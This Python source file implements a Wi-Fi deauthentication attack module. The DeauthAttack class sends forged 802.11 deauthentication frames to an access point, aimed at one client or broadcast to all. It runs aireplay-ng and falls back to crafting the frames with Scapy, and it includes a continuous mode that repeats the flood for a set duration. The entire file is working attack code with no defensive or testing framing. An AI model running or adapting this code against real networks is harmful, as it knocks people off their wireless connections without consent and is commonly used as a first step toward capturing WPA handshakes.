import subprocess
import time
from typing import Optional, Dict
from scapy.all import *
import threading

class DeauthAttack:
    """Deauthentication attack module for disconnecting clients"""
    
    def __init__(self):
        self.attack_active = False
        self.packets_sent = 0
    
    def execute(self, interface: str, target_bssid: str, 
                target_client: Optional[str] = None, 
                packet_count: int = 50) -> Dict:
        """Execute deauthentication attack"""
        try:
            # Reset counter
            self.packets_sent = 0
            self.attack_active = True
            
            # Method 1: Try using aireplay-ng (more reliable)
            try:
                return self._deauth_with_aireplay(interface, target_bssid, 
                                                  target_client, packet_count)
            except:
                # Method 2: Fallback to Scapy
                return self._deauth_with_scapy(interface, target_bssid, 
                                               target_client, packet_count)
        
        except Exception as e:
            self.attack_active = False
            return {
                "success": False,
                "error": str(e),
                "packets_sent": self.packets_sent
            }
    
    def _deauth_with_aireplay(self, interface: str, target_bssid: str,
                              target_client: Optional[str], 
                              packet_count: int) -> Dict:
        """Deauth using aireplay-ng"""
        try:
            cmd = ['aireplay-ng', '--deauth', str(packet_count), '-a', target_bssid]
            
            if target_client:
                cmd.extend(['-c', target_client])
            
            cmd.append(interface)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse output for packets sent
            output = result.stdout + result.stderr
            if 'sending' in output.lower() or 'deauth' in output.lower():
                success = True
                message = f"Deauth attack completed on {target_bssid}"
                if target_client:
                    message += f" targeting {target_client}"
            else:
                success = False
                message = "Deauth attack may have failed - check output"
            
            return {
                "success": success,
                "message": message,
                "target_bssid": target_bssid,
                "target_client": target_client or "broadcast",
                "packets_requested": packet_count,
                "output": output[:500]  # First 500 chars of output
            }
        
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command timeout",
                "packets_sent": 0
            }
        except Exception as e:
            raise e
    
    def _deauth_with_scapy(self, interface: str, target_bssid: str,
                           target_client: Optional[str], 
                           packet_count: int) -> Dict:
        """Deauth using Scapy packet crafting"""
        try:
            # Create deauth packet
            if target_client:
                # Targeted deauth
                client = target_client
            else:
                # Broadcast deauth
                client = "ff:ff:ff:ff:ff:ff"
            
            # Craft deauth packet
            # Reason code 7: Class 3 frame received from nonassociated STA
            dot11 = Dot11(addr1=client, addr2=target_bssid, addr3=target_bssid)
            deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
            
            # Send packets
            for i in range(packet_count):
                sendp(deauth_pkt, iface=interface, verbose=False)
                self.packets_sent += 1
                time.sleep(0.01)  # Small delay between packets
            
            return {
                "success": True,
                "message": f"Sent {self.packets_sent} deauth packets",
                "target_bssid": target_bssid,
                "target_client": target_client or "broadcast",
                "packets_sent": self.packets_sent
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "packets_sent": self.packets_sent
            }
        finally:
            self.attack_active = False
    
    def continuous_deauth(self, interface: str, target_bssid: str,
                         target_client: Optional[str] = None,
                         duration: int = 60) -> Dict:
        """Execute continuous deauth attack for specified duration"""
        self.attack_active = True
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration and self.attack_active:
                # Send burst of deauth packets
                self.execute(interface, target_bssid, target_client, 10)
                time.sleep(1)  # Wait 1 second between bursts
            
            return {
                "success": True,
                "message": f"Continuous deauth completed",
                "duration": duration,
                "total_packets": self.packets_sent
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
        finally:
            self.attack_active = False
    
    def stop_attack(self):
        """Stop ongoing attack"""
        self.attack_active = False